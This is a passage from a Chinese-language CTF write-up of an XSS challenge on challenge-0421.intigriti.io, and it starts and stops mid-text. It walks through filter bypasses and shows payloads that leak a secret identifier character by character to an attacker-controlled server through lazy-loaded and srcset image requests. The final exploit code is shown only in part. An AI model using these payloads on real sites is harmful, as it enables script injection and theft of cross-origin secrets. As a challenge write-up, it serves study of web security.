<p>結合以上條件，如果我傳 error&#x3D;123，畫面就會顯示 123。如果我傳 <code>&lt;h1&gt;hello&lt;/h1&gt;</code>，畫面就真的會顯示一個 hello 的 heading，但如果我傳 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，畫面就只會用文字顯示出來而不是當作 HTML 來執行，因為 safe 是 false。</p>
<p>以上大概就是題目的基本介紹，在這邊非常推薦大家自己先玩玩看，至少嘗試個一兩個小時卡關卡到爆之後再來看心得，收穫會多很多。</p>
<p>底下就是解題的心路歷程，會直接按照我解題的時間軸來寫。</p>
<h2><span id="初次嘗試">初次嘗試</span></h2><p>從題目中不難看出，想要成功 XSS 的話有兩條路可以走：</p>
<ol>
<li>用各種奇技淫巧繞過限制，直接在頁面上執行 XSS</li>
<li>自己用 <code>window.open</code> 打開這頁面然後 postMessage，偽造訊息並且讓 safe 是 true，這樣就可以插入任意 HTML</li>
</ol>
<p>一開始我是朝 1 的方向來想，因為 2 的話需要知道 identifier 是什麼，但因為那是隨機的所以不可能，我認為是一條死路。</p>
<p>所以接下來就是要想，要怎麼樣去繞過判斷的限制。</p>
<p>從濾掉的 tag 中可以發現我最愛的 <code>&lt;img&gt;</code> 沒有被濾掉，而 onXX 的 event handler 只是限制內容，也沒有一起被濾掉，所以可以用：<code>&lt;img src=x onerror=123&gt;</code> 來執行 JS。</p>
<p>但問題來了，儘管可以執行 JS，但不能用的字元太多了，<code>()</code> 不能用所以不能呼叫函式，想用反引號 &#96; 來呼叫也不行，那要怎麼樣執行 alert？我在這邊卡了很久，最後去 google：「js call function without parentheses」，找到了這一篇：<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses/35949617">js call function without parentheses</a>，裡面提到了很多沒有想過的招數。</p>
<p>例如說物件的 valueOf 搭配 +，或者是用 new 的方式搭配 constructor，或最讓我驚豔的一個是 onerror&#x3D;eval 搭配 throw，這些都是超級帥的技巧，試著不用 <code>()</code> 來繞過限制。</p>
<p>但以上這些通通都沒用，因為限制實在是太嚴格了，物件的 <code>&#123;&#125;</code> 不能用，new 因為要有空格所以也不能用。不能有空格是因為 <code>&lt;img onerror=new abc&gt;</code> 會被解釋為：<code>&lt;img onerror=&quot;new&quot; abc&gt;</code>，如果想要一起被放入 onerror 就只能自己用 <code>&quot;</code> 框起來，但 <code>&quot;</code> 是限制的字元不能使用，所以 onerror 裡面不能出現空格。</p>
<p>throw 看起來有點機會，但是作為執行前提的 <code>onerror=eval</code> 有個等號，所以也沒辦法使用。</p>
<p>在這時候我就想說，那如果把限制的字元用 HTML entity encode 呢？把 <code>=</code> 變成 <code>&amp;#61;</code> 來繞過限制。</p>
<p>試了之後發現沒有用，因為早在第一步 <code>decodeHTMLEntities(str)</code> 的時候就被還原成字元了，這時候我有兩個想法：</p>
<ol>
<li>那可以對 decodeHTMLEntities 裡面的 textarea XSS 嗎？</li>
<li>那可以 double encode 嗎？</li>
</ol>
<p>第一條路行不通，因為雖然有 <code>ta.innerHTML = str;</code>，但這元素從來沒有被放到 DOM 上，所以沒有用。</p>
<p>第二條路也行不通，因為最後 <code>&amp;#61;</code> 只會被視作文字來顯示。</p>
<p>嘗試了許久，最後我什麼都試不出來，可以執行成功的程式碼頂多只有：<code>&lt;img src=x onerror=throw/0/+identifier&gt;</code>，把 identifier 作為錯誤訊息丟出來，然後就沒了。但這也什麼都做不到。</p>
<h2><span id="提示的幫助">提示的幫助</span></h2><p>這個挑戰每獲得 100 個愛心就會放出提示，而因為題目難度太高的關係所以也有加碼提示，我那時看到的有：</p>
<ol>
<li>First hint: find the objective! (4&#x2F;19 21:57)</li>
<li>Time for another hint! Where to smuggle data? (4&#x2F;20 00:24)</li>
<li>Time for another tip! One bite after another! (4&#x2F;20 19:55)</li>
</ol>
<p>說實在的，以上這幾個提示我都沒有看很懂，比較了解的是第三個，應該是 One “Byte” after another 的意思，回顧到我最前面所提到的 XS-Leaks 那個東西，我這時想說：「靠，該不會我一開始以為死路的路才是正解吧」。</p>
<p>我說的死路就是前面提到的：「從別的地方自己 postMessage 偽造訊息」，但前提是我要知道隨機產生的 identifier 是什麼才能成功。如果說這條路才是正解，那要解開的話流程就應該是：</p>
<ol>
<li>開一個自己的網頁，用 window.open 打開 xss challenge</li>
<li>用某種方法得到 identifier</li>
<li>從這個網頁自己 postMessage 過去，插入任意 HTML</li>
</ol>
<p>只要第二步成功了就可以整個串起來了。但問題是，我要怎麼知道 identifier 是什麼？既然提示說 one byte after another，那我猜應該是一個字元一個字元洩漏出去，所以可以先從一個字元開始想。</p>
<p>此時我想到這個：<code>&lt;img src=x onerror=identifier&lt;&#39;1&#39;?is_zero:keep_trying&gt;</code>，我們可以用三元運算子搭配 <code>&lt;</code> 來判斷第一個字是什麼，雖然不能用字串，但 <code>&#39;1&#39;</code> 可以用 <code>&lt;div id=n1&gt;1&lt;/div&gt;</code> + <code>n1.innerText</code> 來取代，來避開單雙引號。而三元運算子可以一直巢狀下去，像是這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">identifier<span class="token operator">&lt;</span><span class="token string">'1'</span><span class="token operator">?</span>is_zero<span class="token operator">:</span>
identifier<span class="token operator">&lt;</span><span class="token string">'2'</span><span class="token operator">?</span>is_one<span class="token operator">:</span>
identifier<span class="token operator">&lt;</span><span class="token string">'3'</span><span class="token operator">?</span>is_two<span class="token operator">:</span>
identifier<span class="token operator">&lt;</span><span class="token string">'4'</span><span class="token operator">?</span>is_three<span class="token operator">:</span>
<span class="token operator">...</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>所以我們確實可以透過這方法得知 identifier 的第一個字元是什麼，但問題來了，知道之後，我們怎樣把這個資訊傳出去？</p>
<p>我們不能呼叫 function，甚至連賦值也不行，怎樣把資訊傳出去？如果可以用 <code>=</code> 的話那就可以 <code>window.opener.location = xxx+1</code> 之類的去改變 window.opener 的資訊，或者是：<code>&lt;img id=a src=x&gt;</code> 搭配 <code>a.src=xxxx</code> 去載入一個新的圖片，這樣我從 server side 就可以知道洩漏的字元是什麼。</p>
<p>但因為沒辦法用等號，所以上面這些都做不到。</p>
<p>這時候我又卡關了，而且卡了非常久，完全想不到該怎麼把資訊傳出去，這時候等到了下一個提示：</p>
<ol>
<li>Here’s an extra tip: ++ is also an assignment (4&#x2F;20 22:17)</li>
</ol>
<p>我一開始看見這提示時覺得好像有點用，卻又不知道該怎麼用。<code>++</code> 也可以改變值沒有錯，可是有什麼用呢？我一開始想說朝 window.opener 的方向去想，有沒有一些屬性是可以操控的，例如說：<code>window.opener.name++</code>是可行的嗎？或是有什麼其他屬性可以操控的。</p>
<p>如果我能夠改變某個 window.opener 的屬性，就能把洩漏的資訊透過某種方式傳回去。可是我找了很久還去翻了 spec，發現好像沒這種東西。<code>window.opener.location</code> 可以改變，但不能用 <code>++</code>，因為 <code>++</code> 就像是 <code>window.opener.location = window.opener.location + 1</code>，執行的話會拋錯，因為有涉及到讀取：</p>
<pre class="line-numbers language-none"><code class="language-none">VM82:1 Uncaught DOMException: Blocked a frame with origin &quot;https:&#x2F;&#x2F;challenge-0421.intigriti.io&quot; from accessing a cross-origin frame.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>這時我想起了忘記在哪學到的一個招數，利用圖片的載入。</p>
<p>舉例來說，讓一張圖片不被載入，然後透過 ++ 改變 CSS 或其他屬性讓它載入，這樣我就可以從 server 知道這個資訊。</p>
<p>我試了這個：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">opacity</span><span class="token punctuation">:</span>0<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>
&lt;img src=x onerror=identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.style.opacity++:</span>...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>但透明度是 0 還是會載入圖片，所以沒有用。後來再試了幾個屬性，想起了最近有用到的一個：<code>loading</code>。</p>
<p>以往如果要 lazy load 圖片的話，比較多是透過套件，早期需要去偵測 scroll，近期則是用 IntersectionObserver 就行了。而再更近一點，現在有不少瀏覽器有支援原生的 lazy loading：<code>&lt;img src=x loding=&quot;lazy&quot;&gt;</code>，如果圖片距離可視區域沒有超過一個 threshold 的話就不會被載入。</p>
<p>因此我們可以這樣做：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 9999px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
&lt;img src=x onerror=identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.loading++:</span>...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>先用一個很高的 div 把圖片往下推，推到 threshold 之外，然後在確認第一個字元是 0 的時候，把 n0 的 loading++，++ 之後會是 NaN，然後因為 loading 沒有 NaN 這個值，所以會 fallback 到預設的 auto，就會載入圖片。</p>
<p>假設 <code>server/n0</code> 是我自己的 server，那我收到 n0 這個 request，就代表第一個字元是 0。把這個想法擴展，我們確實可以知道第一個字元是什麼，像這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">height</span><span class="token punctuation">:</span> 9999px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n0</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n0</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n1</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n1</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>n2</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>//server/n2</span> <span class="token attr-name">loading</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>lazy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
&lt;img src=x onerror=
identifier<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">'1'?n0.loading++:</span></span>
<span class="token attr-name"><span class="token namespace">identifier&lt;'2'?n1.loading++:</span></span>
<span class="token attr-name"><span class="token namespace">identifier&lt;'3'?n2.loading++:</span></span>
<span class="token attr-name">...</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有了第一個字元了！那第二個怎麼辦？</p>
<p>沒辦法用 <code>identifier[1]</code>，因為不能用括號。我想說有沒有 <code>str.1</code> 這種語法，結果也沒有。</p>
<p>在想過各種可能以後，我覺得這條路是死路，不可能在不能使用 <code>[]()&#123;&#125;</code> 的情況下，拿到第 n 個字元。</p>
<h2><span id="解開弱化版">解開弱化版？</span></h2><p>雖然說我覺得不可能拿到第 n 個字元，解題也就此卡住，但我有了一個大膽的想法。</p>
<p>字串我沒有辦法拿到第 n 個字元，但如果是數字呢？我是不是可以透過一系列數學運算拿到？例如說 123，要拿到 2 就是 123&#x2F;10%10 之類的（不過出來會是小數）。或者是直接利用二進位，<code>num&amp;1</code> 就可以知道 num 的最後一個 bit，<code>num&amp;2</code> 就可以知道倒數第二個 bit，以此類推，就可以知道每一個 bit 是多少。</p>
<p>可是 identifier 不是數字，那該怎麼辦？想辦法轉成數字！如果 identifier 只包含 0-9a-z，那我們可以在前面加上 <code>0x</code> 並搭配 + 轉成數字，最後會像這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span>
  <span class="token operator">&lt;</span>div style<span class="token operator">=</span>height<span class="token operator">:</span>9999px id<span class="token operator">=</span>a<span class="token operator">></span>0x<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x00 id<span class="token operator">=</span>x00 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x01 id<span class="token operator">=</span>x01 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x10 id<span class="token operator">=</span>x10 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x11 id<span class="token operator">=</span>x11 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x20 id<span class="token operator">=</span>x20 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>example<span class="token punctuation">.</span>com<span class="token operator">/</span>x21 id<span class="token operator">=</span>x21 loading<span class="token operator">=</span>lazy<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span>
a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">?</span>x01<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x00<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">?</span>x11<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x10<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token punctuation">;</span>
a<span class="token punctuation">.</span>innerText<span class="token operator">+</span>identifier<span class="token operator">&amp;</span><span class="token number">4</span><span class="token operator">?</span>x21<span class="token punctuation">.</span>loading<span class="token operator">++</span><span class="token operator">:</span>x20<span class="token punctuation">.</span>loading<span class="token operator">++</span> <span class="token operator">></span>

<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
  <span class="token keyword">var</span> identifier <span class="token operator">=</span> <span class="token string">'a4'</span> <span class="token comment">// 164</span>
  <span class="token comment">// 10100100</span>
  
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>這邊要注意的是 operator 的優先順序，有些如果順序不如預期就無法那樣用，例如說：<code>+&#39;0x&#39;+identifier</code> 就會先執行 <code>+0x</code>，而不是先把後面的字串相加。這邊剛好 &amp; 會先試著轉成數字，所以才能這樣用。</p>
<p>從上面的 POC 可以證明如果我們能把 identifier 轉成數字，我們就可以解開這題。但 identifier 可能會有 f 以上的字元，那他可以轉成數字的機率是多少呢？</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">100000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> id <span class="token operator">=</span> <span class="token function">getIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token function">isNaN</span><span class="token punctuation">(</span><span class="token function">Number</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    count<span class="token operator">++</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 7, 0.007</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span> <span class="token punctuation">(</span>count <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">100000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>不到 0.01%，非常低的機率，平均需要一萬次才能成功。</p>
<p>雖然這個機率無法接受，但至少我知道這個弱化的版本是解得開的。</p>
<h2><span id="又靠提示">又靠提示</span></h2><p>在弱化版解開之後，我想說差不多就到這裡了。會不會是我方向錯誤，其實根本不是這樣解？</p>
<p>因為我真的想不到該怎樣才能拿到 <code>identifier[n]</code>，覺得這不可能。</p>
<p>此時我又看到了新的提示：</p>
<ol>
<li>“Behind a Greater Oracle there stands one great Identity” (leak it) (4&#x2F;22 15:53)</li>
<li>Tipping time! Goal &lt; object(ive) (4&#x2F;23 01:58)</li>
</ol>
<p>從這兩個新的提示，驗證了我的方向其實是對的，就是要 leak identifier，然後就是要用 <code>&lt;</code> 的符號去比較。</p>
<p>所以我應該只差最後一兩步而已，就快要破關了。但這一兩步真的很難。</p>
<p>雖然說已經想要放棄了，但過了一天，又有一個新的想法：「其實根本不需要單獨拿到第二個字元！假設我有個地方 str 存第一個字元，那我只要 <code>identifier &lt; str + &#39;1&#39;</code> 不就好了嗎？」</p>
<p>如果有地方存已經找到的字元，那就可以用類似迴圈的概念去跑，就可以洩漏出所有字元了。</p>
<p>那這個地方會是哪裡？這地方需要可以從 opener 傳過來，因為只有 opener 會知道現在洩漏出去的字元是什麼。可是因為 cross origin 的關係，opener 沒有一個屬性是可以存取的。</p>
<p>嘗試了大概一兩個小時，我突然想到可以反過來，不是從 opener 拿東西，而是 opener 把東西傳給 open 的 window。怎麼傳？可以用 location.hash！</p>
<p>從我們的網頁中用 window.open 開啟 XSS challenge 之後，可以用 <code>win.location = url + &#39;#a&#39;</code> 來加上 hash 而且不會重新載入網頁。加入之後在網頁中就可以用 <code>location.hash</code> 存取到。透過 location.hash 在 cross origin 的 window 之間交換資訊。</p>
<p>雖然說又往前邁進了一步，但其實還有兩個問題需要被解決：</p>
<ol>
<li>我們需要一個類似迴圈的東西</li>
<li>我們需要能夠多次發送 request 到 server</li>
</ol>
<p>先從第一個問題開始，我們需要不斷執行類似的程式碼，才能洩漏一個一個字元出來。這個倒是不難，可以透過 <code>this.src++</code> 去改變 img 的 src，只要 src 一被賦值，儘管值一樣，還是會重新載入圖片，例如說這樣：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
    <span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">1</span>
  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript">count<span class="token operator">&lt;</span><span class="token number">10</span><span class="token operator">?</span>count<span class="token operator">++</span><span class="token operator">&amp;&amp;</span>src<span class="token operator">++</span><span class="token operator">:</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面的程式碼會不斷把 count++，直到符合條件為止。<code>count++&amp;&amp;src++</code> 也可以換成 <code>count++ + src++</code>，把空格去掉變成很多加號的 <code>count+++src++</code>。</p>
<p>迴圈沒有問題了，接下來是多次洩露資訊的部分。之前我們用的 lazy loading，一個圖片只能用一次，因為圖片一旦載入了就是載入了，沒辦法再用 img.loading++ 來讓它再被載入一次。那怎麼辦呢？我們需要一個管道可以讓我們在指定的時機發送正確的 request。</p>
<p>在隨便亂試試了一段時間之後，我發現了一個神奇的屬性：srcset，神奇的點在於它跟 src 一起用的時候。</p>
<p>當我 src 與 srcset 一起設定的時候，瀏覽器會優先載入 srcset 的 url，而神奇的是當我把 src++ 的時候，就會再載入一次 srcset！下面是範例，會把 <code>x2</code> 載入十遍：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body<span class="token operator">></span>
  <span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token keyword">var</span> count <span class="token operator">=</span> <span class="token number">1</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>x1 srcset<span class="token operator">=</span>x2 onerror<span class="token operator">=</span>count<span class="token operator">&lt;</span><span class="token number">10</span><span class="token operator">?</span>count<span class="token operator">++</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token operator">++</span><span class="token operator">:</span><span class="token number">123</span><span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>既然這兩個問題都解開了，那把這些拼湊起來，就可以湊出最後的答案了，流程如下：</p>
<ol>
<li>打開 poc.html，window.open XSS challenge</li>
<li>error 帶上我們準備好的 payload</li>
<li>用 img 的 onerror 執行一堆巢狀的三元運算子，符合條件就載入相對應的圖片，洩漏出第 n 個字，並等待下一圈迴圈開始</li>
<li>server 接收到圖片，知道第 n 個字是什麼</li>
<li>server 把結果傳給 poc.html，poc.html 去更新 win.location.hash</li>
<li>更新完之後 server 透過回傳 response 來開啟下一圈迴圈，把 n+1，回到第 3 步</li>
<li>重複以上動作直到找出 token</li>
</ol>
<p>以上是最理想的流程，但因為時間因素所以我有幾個地方沒有照著做，例如說：</p>
<ol>
<li>我假設 identifier 的第一個字是 <code>1</code>，不是的話就跳掉</li>
<li>server 等待 500ms 就會開始下一圈迴圈，但有可能 location.hash 還沒更新完成</li>
<li>server 傳結果給 poc.html 最理想是用 websocket，但我偷懶用 long polling</li>
<li>我懶的判斷 identifier 是不是全部抓完，所以等 length &gt; 10 就開始嘗試 postMessage</li>
</ol>
<p>最後的程式碼長這樣：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
&lt;img srcset=//my_server/0 id=n0 alt=#>
&lt;img srcset=//my_server/1 id=n1 alt=a>
&lt;img srcset=//my_server/2 id=n2 alt=b>
&lt;img srcset=//my_server/3 id=n3 alt=c>
&lt;img srcset=//my_server/4 id=n4 alt=d>
&lt;img srcset=//my_server/5 id=n5 alt=e>
&lt;img srcset=//my_server/6 id=n6 alt=f>
&lt;img srcset=//my_server/7 id=n7 alt=g>
&lt;img srcset=//my_server/8 id=n8 alt=h>
&lt;img srcset=//my_server/9 id=n9 alt=i>
&lt;img srcset=//my_server/a id=n10 alt=j>
&lt;img srcset=//my_server/b id=n11 alt=k>
&lt;img srcset=//my_server/c id=n12 alt=l>
&lt;img srcset=//my_server/d id=n13 alt=m>
&lt;img srcset=//my_server/e id=n14 alt=n>
&lt;img srcset=//my_server/f id=n15 alt=o>
&lt;img srcset=//my_server/g id=n16 alt=p>
&lt;img srcset=//my_server/h id=n17 alt=q>
&lt;img srcset=//my_server/i id=n18 alt=r>
&lt;img srcset=//my_server/j id=n19 alt=s>
&lt;img srcset=//my_server/k id=n20 alt=t>
&lt;img srcset=//my_server/l id=n21 alt=u>
&lt;img srcset=//my_server/m id=n22 alt=v>
&lt;img srcset=//my_server/n id=n23 alt=w>
&lt;img srcset=//my_server/o id=n24 alt=x>
&lt;img srcset=//my_server/p id=n25 alt=y>
&lt;img srcset=//my_server/q id=n26 alt=z>
&lt;img srcset=//my_server/r id=n27 alt=0>
&lt;img srcset=//my_server/s id=n28>
&lt;img srcset=//my_server/t id=n29>
&lt;img srcset=//my_server/u id=n30>
&lt;img srcset=//my_server/v id=n31>
&lt;img srcset=//my_server/w id=n32>
&lt;img srcset=//my_server/x id=n33>
&lt;img srcset=//my_server/y id=n34>
&lt;img srcset=//my_server/z id=n35>

&lt;img id=lo srcset=//my_server/loop onerror=
n0.alt+identifier&lt;location.hash+1?n0.src+++lo.src++:
n0.alt+identifier&lt;location.hash+2?n1.src+++lo.src++:
n0.alt+identifier&lt;location.hash+3?n2.src+++lo.src++:
n0.alt+identifier&lt;location.hash+4?n3.src+++lo.src++:
n0.alt+identifier&lt;location.hash+5?n4.src+++lo.src++:
n0.alt+identifier&lt;location.hash+6?n5.src+++lo.src++:
n0.alt+identifier&lt;location.hash+7?n6.src+++lo.src++:
n0.alt+identifier&lt;location.hash+8?n7.src+++lo.src++:
n0.alt+identifier&lt;location.hash+9?n8.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n1.alt?n9.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n2.alt?n10.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n3.alt?n11.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n4.alt?n12.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n5.alt?n13.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n6.alt?n14.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n7.alt?n15.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n8.alt?n16.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n9.alt?n17.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n10.alt?n18.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n11.alt?n19.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n12.alt?n20.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n13.alt?n21.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n14.alt?n22.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n15.alt?n23.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n16.alt?n24.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n17.alt?n25.src+++lo.src++:
